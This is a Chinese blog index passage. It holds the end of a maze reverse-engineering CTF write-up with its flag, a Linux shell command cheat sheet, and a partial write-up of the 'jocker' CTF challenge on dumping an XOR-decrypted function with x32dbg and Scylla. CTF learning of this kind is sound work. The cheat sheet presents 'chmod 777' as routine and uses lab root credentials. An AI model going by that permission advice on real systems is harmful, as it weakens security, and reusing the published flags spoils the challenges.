class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x30&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x54&#x27;</span>, <span class="hljs-string">&#x27;0x54&#x27;</span>, <span class="hljs-string">&#x27;0x54&#x27;</span>, <span class="hljs-string">&#x27;0x49&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x54&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x49&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x54&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x49&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x21&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> j==<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;S&quot;</span>,end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">elif</span> maze[<span class="hljs-number">16</span>*i + j] == <span class="hljs-string">&#x27;0x0&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;O&quot;</span>,end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">elif</span> maze[<span class="hljs-number">16</span>*i + j] == <span class="hljs-string">&#x27;0x21&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;E&quot;</span>,end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;X&quot;</span>,end=<span class="hljs-string">&quot; &quot;</span>)<br>         <br>        <br></code></pre></td></tr></table></figure><p>运行得到迷宫<br><img src="/2022/09/09/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga/3.png" alt="3"></p><p>走迷宫即可得到flag{MEWEMEWJMEWJM}</p>]]></content>
    
    
    <categories>
      
      <category>buu</category>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>maze</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux_shell命令</title>
    <link href="/2022/09/08/linux-shell%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/09/08/linux-shell%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="0-编译"><a href="#0-编译" class="headerlink" title="0.编译"></a>0.编译</h2><p>gcc Hello.c -o hello</p><p>g++  hello.cpp -0 hello</p><h2 id="1-打开终端命令行"><a href="#1-打开终端命令行" class="headerlink" title="1.打开终端命令行"></a>1.打开终端命令行</h2><p>方法一：右键-&gt;打开终端。<br>方法二：Ctrl+Alt+T</p><h2 id="2-常用快捷键"><a href="#2-常用快捷键" class="headerlink" title="2.常用快捷键"></a>2.常用快捷键</h2><h3 id="2-1-tab键"><a href="#2-1-tab键" class="headerlink" title="2.1 tab键"></a>2.1 tab键</h3><p>tab键是有两个功能，一个一次tab命令补齐，另一个两次tab提示内容，如果我们不记得一个命令的全拼，或者不记得某个路径的全拼，可以输入命令的前面几个字母，然后使用tab键自动补齐命令或查看提示信息。</p><h3 id="2-2-Ctrl-c组合键"><a href="#2-2-Ctrl-c组合键" class="headerlink" title="2.2 Ctrl+c组合键"></a>2.2 Ctrl+c组合键</h3><p>Ctrl+c中断，强行打断进程，如果终端命令行正在执行某个进程的程序，这时想要中断掉该进程就可以使用Ctrl+c。</p><h3 id="2-3-Ctrl-d组合键"><a href="#2-3-Ctrl-d组合键" class="headerlink" title="2.3 Ctrl+d组合键"></a>2.3 Ctrl+d组合键</h3><p>Ctrl+d退出，相当于exit和quit，比如用python命令进入python交互环境后，就可以用Ctrl+d退出python交互。</p><h3 id="2-4Ctrl-Shift-c组合键和Ctrl-Shift-v组合键"><a href="#2-4Ctrl-Shift-c组合键和Ctrl-Shift-v组合键" class="headerlink" title="2.4Ctrl+Shift+c组合键和Ctrl+Shift+v组合键"></a>2.4Ctrl+Shift+c组合键和Ctrl+Shift+v组合键</h3><p>在终端中复制粘贴时，先用鼠标选中需要复制的内容，然后用Ctrl+Shift+c进行复制，再用Ctrl+Shift+v进行粘贴。</p><h3 id="2-5图形界面和纯文本交互模式切换"><a href="#2-5图形界面和纯文本交互模式切换" class="headerlink" title="2.5图形界面和纯文本交互模式切换"></a>2.5图形界面和纯文本交互模式切换</h3><p>Ctrl+Alt+F1F6:纯文本交互模式登入tty1tty6终端机；<br>Ctrl+Alt+F7：切回图形界面。</p><h3 id="3-终端命令行中一些常用符号了解"><a href="#3-终端命令行中一些常用符号了解" class="headerlink" title="3.终端命令行中一些常用符号了解"></a>3.终端命令行中一些常用符号了解</h3><p>用户主目录：~<br>系统根目录：&#x2F;<br>一般用户提示符：$<br>root用户提示符：#</p><p>shell当前所在目录：.</p><h3 id="4-关机与重启命令"><a href="#4-关机与重启命令" class="headerlink" title="4.关机与重启命令"></a>4.关机与重启命令</h3><h4 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h4><p>sudo poweroff</p><h4 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h4><p>sudo reboot</p><h3 id="5-目录与文件相关命令"><a href="#5-目录与文件相关命令" class="headerlink" title="5.目录与文件相关命令"></a>5.目录与文件相关命令</h3><h4 id="通配符的使用"><a href="#通配符的使用" class="headerlink" title="通配符的使用"></a>通配符的使用</h4><p>*代表任意个数个字符</p><p>?代表任意一个字符，至少一个</p><p>[]表示可以匹配字符组中的任意一个</p><p>[abc]匹配a、b、c中的任意一个</p><p>[a-f]匹配从a-f范围内的任意一个字符</p><h4 id="显示文件和目录列表"><a href="#显示文件和目录列表" class="headerlink" title="显示文件和目录列表"></a>显示文件和目录列表</h4><p>ls</p><h4 id="切换目录"><a href="#切换目录" class="headerlink" title="切换目录"></a>切换目录</h4><p>cd &lt;目标目录&gt;</p><p>cd  切换到当前用户的主目录（&#x2F;home&#x2F;用户目录)</p><p>cd ~  切换到当前用户的主目录（&#x2F;home&#x2F;用户目录)</p><p>cd .  保持在当前目录不变</p><p>cd ..  切换到上级目录</p><p>cd -  可以在最近两次工作目录之间来回切换</p><h4 id="显示当前所在工作目录"><a href="#显示当前所在工作目录" class="headerlink" title="显示当前所在工作目录"></a>显示当前所在工作目录</h4><p>pwd</p><h4 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h4><p>touch &lt;文件名&gt;</p><p>创建文件或修改文件创建时间</p><h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><p>cp &lt;源文件路径&gt; &lt;目标文件路径&gt;</p><h4 id="移动文件"><a href="#移动文件" class="headerlink" title="移动文件"></a>移动文件</h4><p>mv &lt;源文件路径&gt; &lt;目标文件路径&gt;</p><h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h4><p>rm &lt;文件名&gt;</p><p>rm是从磁盘中删除，删除后无法恢复文件</p><p>-f  强制删除，忽略不存在的文件，无需提示  </p><p>-r  递归地删除目录下的内容，删除文件夹时必须加此参数</p><h4 id="显示文件内容"><a href="#显示文件内容" class="headerlink" title="显示文件内容"></a>显示文件内容</h4><p>cat &lt;文件名&gt;</p><h4 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h4><p>mkdir &lt;文件夹名&gt;</p><h4 id="删除文件夹"><a href="#删除文件夹" class="headerlink" title="删除文件夹"></a>删除文件夹</h4><p>rmdir &lt;文件夹名&gt;</p><h3 id="6-文件权限"><a href="#6-文件权限" class="headerlink" title="6.文件权限"></a>6.文件权限</h3><h4 id="修改文件读写可执行权限-具体权限由掩码值决定，如777权限全开"><a href="#修改文件读写可执行权限-具体权限由掩码值决定，如777权限全开" class="headerlink" title="修改文件读写可执行权限,具体权限由掩码值决定，如777权限全开"></a>修改文件读写可执行权限,具体权限由掩码值决定，如777权限全开</h4><p>sudo chmod 777 &lt;文件名&gt;</p><h4 id="修改文件所有者"><a href="#修改文件所有者" class="headerlink" title="修改文件所有者"></a>修改文件所有者</h4><p>sudo chown &lt;用户名&gt;:&lt;组名&gt; &lt;文件名&gt;</p><h3 id="7-文件查找"><a href="#7-文件查找" class="headerlink" title="7.文件查找"></a>7.文件查找</h3><h4 id="7-1locate命令查找文件"><a href="#7-1locate命令查找文件" class="headerlink" title="7.1locate命令查找文件"></a>7.1locate命令查找文件</h4><p>sudo updatedb<br>locate &lt;待查找文件名&gt;</p><h4 id="7-2find命令查找文件"><a href="#7-2find命令查找文件" class="headerlink" title="7.2find命令查找文件"></a>7.2find命令查找文件</h4><p>find -name &lt;待查找文件名&gt;</p><h3 id="8-网络相关命令"><a href="#8-网络相关命令" class="headerlink" title="8.网络相关命令"></a>8.网络相关命令</h3><h4 id="网络连接与否测试"><a href="#网络连接与否测试" class="headerlink" title="网络连接与否测试"></a>网络连接与否测试</h4><p>ping &lt;待测目标主机IP或域名&gt;</p><h4 id="本地IP地址查看"><a href="#本地IP地址查看" class="headerlink" title="本地IP地址查看"></a>本地IP地址查看</h4><p>ifconfig</p><h4 id="远程登录到目标主机"><a href="#远程登录到目标主机" class="headerlink" title="远程登录到目标主机"></a>远程登录到目标主机</h4><p>ssh &lt;目标主机用户名&gt;@&lt;目标主机IP地址&gt;</p><h3 id="9-系统软件安装与软件运行方法"><a href="#9-系统软件安装与软件运行方法" class="headerlink" title="9.系统软件安装与软件运行方法"></a>9.系统软件安装与软件运行方法</h3><h4 id="9-1系统默认的软件安装方法apt-get"><a href="#9-1系统默认的软件安装方法apt-get" class="headerlink" title="9.1系统默认的软件安装方法apt-get"></a>9.1系统默认的软件安装方法apt-get</h4><p>sudo apt-get update<br>sudo apt-get install &lt;软件包名称&gt;</p><h4 id="9-2-source方法执行系统脚本，比如执行用户默认配置脚本-bashrc"><a href="#9-2-source方法执行系统脚本，比如执行用户默认配置脚本-bashrc" class="headerlink" title="9.2 source方法执行系统脚本，比如执行用户默认配置脚本.bashrc"></a>9.2 source方法执行系统脚本，比如执行用户默认配置脚本.bashrc</h4><p>source ~&#x2F;.bashrc</p><h4 id="9-3-x2F-方法执行一般可执行文件"><a href="#9-3-x2F-方法执行一般可执行文件" class="headerlink" title="9.3 .&#x2F;方法执行一般可执行文件"></a>9.3 .&#x2F;方法执行一般可执行文件</h4><p>.&#x2F;&lt;可执行文件&gt;</p><h3 id="10-文本编辑器vim使用"><a href="#10-文本编辑器vim使用" class="headerlink" title="10.文本编辑器vim使用"></a>10.文本编辑器vim使用</h3><h4 id="vim查看文件内容"><a href="#vim查看文件内容" class="headerlink" title="vim查看文件内容"></a>vim查看文件内容</h4><p>vim &lt;文件名&gt;</p><h4 id="vim进入编辑模式"><a href="#vim进入编辑模式" class="headerlink" title="vim进入编辑模式"></a>vim进入编辑模式</h4><p>在vim查看文件内容的界面中，按i键进入编辑模式，然后就可以编辑文件的内容了</p><h4 id="vim退出编辑模式"><a href="#vim退出编辑模式" class="headerlink" title="vim退出编辑模式"></a>vim退出编辑模式</h4><p>在vim编辑文件内容的界面中，按Esc键退出编辑模式，然后就又回到查看文件内容的界面了</p><h4 id="vim编辑内容保存"><a href="#vim编辑内容保存" class="headerlink" title="vim编辑内容保存"></a>vim编辑内容保存</h4><p>vim在编辑完文件内容，退出到查看文件内容的界面后，可以输入“:w”对编辑内容进行保存，也可以输入“:wq”对编辑内容进行保存并退出vim</p><h3 id="后续补充内容"><a href="#后续补充内容" class="headerlink" title="后续补充内容"></a>后续补充内容</h3><h5 id="1-ssh"><a href="#1-ssh" class="headerlink" title="1)ssh"></a>1)ssh</h5><p>ssh链接  ssh -p 端口号 用户名@地址 </p><p>例：</p><p>ssh 用户名：root 密码：123456 地址和端口为动态分配的。</p><p>靶机信息:node4.buuoj.cn:28508</p><p>链接代码：ssh -p 28508 <a href="mailto:&#114;&#111;&#111;&#x74;&#x40;&#110;&#x6f;&#100;&#x65;&#x34;&#46;&#x62;&#x75;&#117;&#111;&#x6a;&#x2e;&#99;&#x6e;">&#114;&#111;&#111;&#x74;&#x40;&#110;&#x6f;&#100;&#x65;&#x34;&#46;&#x62;&#x75;&#117;&#111;&#x6a;&#x2e;&#99;&#x6e;</a></p><h5 id="2）top"><a href="#2）top" class="headerlink" title="2）top"></a>2）top</h5><p>查看当前进程</p><h5 id="3）su"><a href="#3）su" class="headerlink" title="3）su"></a>3）su</h5><p>获取root权限</p><h5 id="4-sudo-command"><a href="#4-sudo-command" class="headerlink" title="4)sudo + command"></a>4)sudo + command</h5><p>以root权限执行命令</p><h5 id="5）passwd"><a href="#5）passwd" class="headerlink" title="5）passwd"></a>5）passwd</h5><p>修改当前权限下用户的密码</p><h5 id="6）adduser-username-sudo"><a href="#6）adduser-username-sudo" class="headerlink" title="6）adduser username sudo"></a>6）adduser username sudo</h5><p>将用户添加进超级用户组（root）</p><h5 id="7）whoami"><a href="#7）whoami" class="headerlink" title="7）whoami"></a>7）whoami</h5><p>显示当前用户名称</p><h5 id="8）poweroff"><a href="#8）poweroff" class="headerlink" title="8）poweroff"></a>8）poweroff</h5><p>关机</p><h5 id="9）管道符号"><a href="#9）管道符号" class="headerlink" title="9）管道符号 |"></a>9）管道符号 |</h5><p>这一符号的左右都是Shell命令, <code>A | B</code>的含义是创建两个进程<code>A</code>和<code>B</code>, 并将<code>A</code>进程的标准输出连接到<code>B</code>进程的标准输入</p><h5 id="10）find"><a href="#10）find" class="headerlink" title="10）find"></a>10）find</h5><p><code>find</code>是搜索目录中的文件</p><h5 id="11-grep"><a href="#11-grep" class="headerlink" title="11)grep"></a>11)grep</h5><p>对标准输入进行筛选后标准输出</p><h5 id="12-man"><a href="#12-man" class="headerlink" title="12)man"></a>12)man</h5><p>查看参数中命令的手册</p><h5 id="13）xargs"><a href="#13）xargs" class="headerlink" title="13）xargs"></a>13）xargs</h5><p>将标准输入转换为参数, 传送给第一个参数所指定的程序</p><h5 id="14-wc"><a href="#14-wc" class="headerlink" title="14) wc"></a>14) wc</h5><p>统计指定文件中的字节数、字数、行数，并将统计结果显示输出。该命令统计指定文件中的字节数、字数、行数。如果没有给出文件名，则从标准输入读取。</p><p>wc同时也给出所指定文件的总统计数。</p><p>　-c　 统计字节数</p><p>　-l　  统计行数</p><p>　-m　 统计字符数。这个参数不能与 -c 参数一起使用</p><p>　-w　 统计字数。一个字被定义为空白、跳格或换行字符分隔的字符串</p><p>　-L　 打印最长行的长度</p><p>　-help 　 显示帮助信息</p><p>　-version 显示版本信息</p><h5 id="9），10），11），13）的一个例子"><a href="#9），10），11），13）的一个例子" class="headerlink" title="9），10），11），13）的一个例子"></a>9），10），11），13）的一个例子</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . | grep &#x27;\.c$\|\.h$&#x27; | xargs wc -l<br></code></pre></td></tr></table></figure><p>统计一个目录中(包含子目录)中的代码行数</p><h5 id="15-alias"><a href="#15-alias" class="headerlink" title="15)alias"></a>15)alias</h5><p>查看别名，启用别名</p><h5 id="16）echo"><a href="#16）echo" class="headerlink" title="16）echo"></a>16）echo</h5><p>1.用于字符串的输出，语法“echo [选项] [输出内容]”</p><p>如果输出内容中没有特殊含义，则原内容输出到屏幕；如果输出内容有特殊含义，则输出打印其含义。</p><ul><li><code>-e</code>：支持反斜线控制的字符转换</li><li><code>-n</code>：取消输出后行末的换行符号（内容输出后不换行）</li></ul><ol start="2"><li>echo的重定向</li></ol><p>  echo命令的重定向功能经常被用于清空文件内容（删除文件）时使用</p><p>（1）echo “content” &gt; filename<br>将content覆盖到filename文件当中去，filename文件当中之前的内容不复存在了，实际上是修改了原文件的内容。</p><p>（2）echo “content” &gt;&gt; filename<br>将content追加到filename文件后，对filename文件之前的内容不修改，只进行增添，也叫追加重定向。</p><p>例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost my_shell]# touch test<br>[root@localhost my_shell]# cat test <br>[root@localhost my_shell]# ll<br>total 4<br>-rw-r--r-- 1 root root 175 Nov  6 17:46 del.sh<br>-rw-r--r-- 1 root root   0 Nov  7 23:33 test<br>[root@localhost my_shell]# echo &quot;123456&quot; &gt; test<br>[root@localhost my_shell]# cat test<br>123456<br>[root@localhost my_shell]# echo &quot;111111&quot; &gt; test<br>[root@localhost my_shell]# cat test<br>111111<br>[root@localhost my_shell]# echo &quot;123456&quot; &gt;&gt; test<br>[root@localhost my_shell]# cat test<br>111111<br>123456<br>[root@localhost my_shell]# <br></code></pre></td></tr></table></figure><h5 id="17）linux中的重定向"><a href="#17）linux中的重定向" class="headerlink" title="17）linux中的重定向"></a>17）linux中的重定向</h5><p><a href="https://blog.csdn.net/qq_16268979/article/details/112130317">https://blog.csdn.net/qq_16268979/article/details/112130317</a></p><h5 id="18-printf"><a href="#18-printf" class="headerlink" title="18) printf"></a>18) printf</h5><p><a href="https://www.runoob.com/linux/linux-shell-printf.html">https://www.runoob.com/linux/linux-shell-printf.html</a></p><h5 id="19-sort"><a href="#19-sort" class="headerlink" title="19)sort"></a>19)sort</h5><p>对标准输入进行排序后输出</p><p>其中的选项<code>-n</code>表示按照数值进行排序, 而<code>-r</code>则表示从大到小输出.</p><h5 id="20）du"><a href="#20）du" class="headerlink" title="20）du"></a>20）du</h5><p>磁盘分析工具</p><p>（英文全拼：disk usage）用于显示目录或文件的大小。</p><p>du 会显示指定的目录或文件所占用的磁盘空间。</p><h5 id="21）more"><a href="#21）more" class="headerlink" title="21）more"></a>21）more</h5><p>Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p><p><a href="https://www.runoob.com/linux/linux-comm-more.html">https://www.runoob.com/linux/linux-comm-more.html</a></p><h5 id="22）less"><a href="#22）less" class="headerlink" title="22）less"></a>22）less</h5><p>less 与 more 类似，less 可以随意浏览文件，支持翻页和搜索，支持向上翻页和向下翻页。</p><p><a href="https://m.runoob.com/linux/linux-comm-less.html">https://m.runoob.com/linux/linux-comm-less.html</a></p><h5 id="23）tmux"><a href="#23）tmux" class="headerlink" title="23）tmux"></a>23）tmux</h5><p>tmux是一个 terminal multiplexer（终端复用器），它可以启动一系列终端会话。我们使用命令行时，打开一个终端窗口，会话开始，执行某些命令如fio ，dd，scp，关闭此终端窗口，会话结束，fio dd scp服务会话随之被关闭。有时我们希望我们运行的服务被保留，而不是关闭窗口再打开后，重新手动执行。tmux的主要用途就在于此。</p><p>它解绑了会话和终端窗口。关闭终端窗口再打开，会话并不终止，而是继续运行在执行。将会话与终端窗后彻底分离。</p><p><a href="https://blog.csdn.net/Guzarish/article/details/123391714%EF%BC%88%E8%BF%99%E4%B8%AA%E6%95%99%E7%A8%8B%E6%AF%94%E8%BE%83%E5%85%A8%EF%BC%89">https://blog.csdn.net/Guzarish/article/details/123391714（这个教程比较全）</a></p><h5 id="24-source"><a href="#24-source" class="headerlink" title="24)source"></a>24)source</h5><p>1、source命令是什么？<br>source命令也称为“点命令”，也就是一个点符号（.），是bash的内部命令。<br><strong>注意：该命令通常用命令“.”来替代</strong></p><p>2、source命令 功能（能干什么）？<br>source命令通常用于重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录。因为linux所有的操作都会变成文件的格式存在。</p><p><a href="https://www.cnblogs.com/amxiang/p/16378298.html">https://www.cnblogs.com/amxiang/p/16378298.html</a></p><h5 id="25-who"><a href="#25-who" class="headerlink" title="25)who"></a>25)who</h5><p>你的用户名和终端类型</p><h5 id="26-uname"><a href="#26-uname" class="headerlink" title="26)uname"></a>26)uname</h5><p>查看当前操作系统名称或版本号</p>]]></content>
    
    
    <categories>
      
      <category>basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>青龙组-jocker</title>
    <link href="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/"/>
    <url>/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-青龙组-jocker"><a href="#网鼎杯-2020-青龙组-jocker" class="headerlink" title="[网鼎杯 2020 青龙组]jocker"></a>[网鼎杯 2020 青龙组]jocker</h1><p>本题的难点在于：第12行if语句中对加密函数encrypt的代码本体使用VirtualProtect函数进行了加密保护，再在第24，25行对encrypt函数代码与0x41异或进行解密还原，所以只有执行完for循环后才能得到真正的encrypt函数，因此需要动态调试在for循环结束后并且调用encrypt前的位置下断点，再f8步入真正的encrypt函数中，将真正的加密函数dump下来，感觉就是脱壳，但是这里的壳加在了关键函数上。</p><p>查看文件，无壳，32位，ida查看</p><p>main函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/1.png" alt="1"></p><p>读入输入的flag后复制到Destination中，再进行加密，加密函数encrypt无法查看。</p><p>这里的wrong函数和omg函数暂时不用看，真正的加密过程在encrypt中。</p><p>同时出现了堆栈不平衡的问题，堆栈平衡即正常函数在被调用完后会将栈指针（esp）和桢指针（ebp）还原到被调用前的状态，从而不影响调用它的函数的正常执行。（不仅如此，寄存器也会还原。一般会将调用前的寄存器压入栈，调用完再pop回去）</p><p>这里出现堆栈不平衡是因为在静态编译时encrypt函数还没有被解码还原，不是一个功能正常的函数，导致调用完encrypt后栈指针（esp）没有被还原，影响了调用它的函数正常执行，程序产生错误。只要动态调试，就会进行encrypt函数的还原后再调用encrypt函数，不会出现堆栈不平衡的问题，所以其实不用理会这个问题也能把题目做出来。（网上很多writeup说不解决这个问题无法f5看伪c代码，不知道为什么我可以直接f5不受影响，总之下面是解决方法。）</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/2.png" alt="2"></p><p> 在菜单中的option的general中勾选stack pointer查看函数调用过程中栈指针的变化进行验证</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/3.png" alt="3"></p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/4.png" alt="4"></p><p>可以看到call完encrypt函数后栈指针就乱了，没有被还原到0AC，所以这里手动帮encrypt函数还原栈指针,选中encrypt和finally函数的call指令，alt+k，将偏移修改为0</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/6.png" alt="6"></p><p>修改完后f5反汇编，伪c界面的堆栈不平衡警告就没了</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/5.png" alt="5"> <img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/7.png" alt="7"></p><p>下面设断点动态调试dump出encrypt函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/8.png" alt="8"></p><p>在ida中结合汇编和伪c判断40182B是for循环结束的位置，下面的call jocker.401500就是encrypt函数</p><p>f9到断点后f7步入函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/9.png" alt="9"></p><p>dump的oep是401500，用x32dbg的scylla插件dump后修复</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/10.png" alt="10"></p><p>输入oep后点击IAT Autosearch和Get Imports，再dump出jocker_dump.exe,再点击fix dump，选择jocker_dump.exe,修复文件得到修复完成的jocker_dump_SCY.exe,ida查看</p><p>下面是还原的encrypt函数</p><p>修复后的main函数，观察可知需要经过start函数和sub_40159A函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/11.png" alt="11"></p><p>start函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/12.png" alt="12"></p><p>sub_40159A函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/13.png" alt="13"></p><p>start函数可以逆向出flag的前19位，sub_40159A函数得到后5位</p><p>写脚本逆向</p><p>start</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 